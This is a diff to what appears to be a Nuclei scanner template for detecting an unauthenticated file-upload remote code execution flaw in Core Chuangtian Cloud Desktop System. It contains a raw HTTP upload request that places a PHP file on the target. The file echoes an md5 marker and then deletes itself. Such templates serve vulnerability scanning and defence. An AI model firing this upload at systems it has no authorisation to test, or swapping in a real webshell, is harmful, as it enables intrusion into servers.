@@ -1,10 +1,9 @@
 http:
 - matchers:
-  - condition: and
-    dsl:
-    - contains(body_2, "f0a712e2bcf99c5b0c370b3a4286bb35")
-    - status_code_2 == 200
-    type: dsl
+  - part: body_2
+    type: word
+    words:
+    - '{{md5(string)}}'
   raw:
   - 'POST /Upload/upload_file.php?l=test HTTP/1.1
 
@@ -26,7 +25,7 @@ http:
     Content-Type: image/avif
 
 
-    <?php echo md5("core-chuangtian-cloud"); ?>
+    <?php echo md5("{{string}}");unlink(__FILE__);?>
 
     ------WebKitFormBoundaryfcKRltGv--
 
@@ -36,20 +35,22 @@ http:
     Host: {{Hostname}}
 
     '
-  req-condition: true
 id: core-chuangtian-cloud-rce
 info:
   author: pikpikcu
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10.0
-    cwe-id: CWE-77
+    cvss-score: 10
+    cwe-id: CWE-434,CWE-77
   description: Core Chuangtian Cloud Desktop System is susceptible to remote code
     execution vulnerabilities.
   metadata:
     max-request: 2
+    runzero-review: REJECT/2025-11-07/excluding tag intrusive
   name: Core Chuangtian Cloud Desktop System - Remote Code Execution
   reference:
   - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
   severity: critical
-  tags: rce,fileupload,intrusive,cloud,chuangtian
+  tags: chuangtian,cloud,fileupload,intrusive,rce,vuln
+variables:
+  string: core-chuangtian-cloud-rce
